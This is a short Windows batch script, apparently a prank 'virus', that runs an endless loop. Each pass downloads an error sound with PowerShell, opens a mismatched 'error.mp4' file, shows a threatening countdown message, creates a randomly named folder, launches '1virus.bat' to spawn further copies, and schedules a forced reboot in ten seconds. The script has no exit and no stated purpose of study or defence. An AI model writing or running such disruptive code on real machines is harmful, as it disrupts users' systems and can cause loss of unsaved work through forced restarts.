@echo off
:Admin
powershell -Command "Invoke-WebRequest https://cdn.pixabay.com/download/audio/2022/03/10/audio_e4e7943871.mp3?filename=windows-error-sound-effect-35894.mp3 -Outfile error.mp3"
start error.mp4
start "" /wait cmd /c "echo DO SOMETHING RIGHT NOW YOU ONLY HAVE 10 SECONDS!&echo(&pause"
mkdir %Random%
start 1virus.bat
shutdown -r -t 10
goto Admin
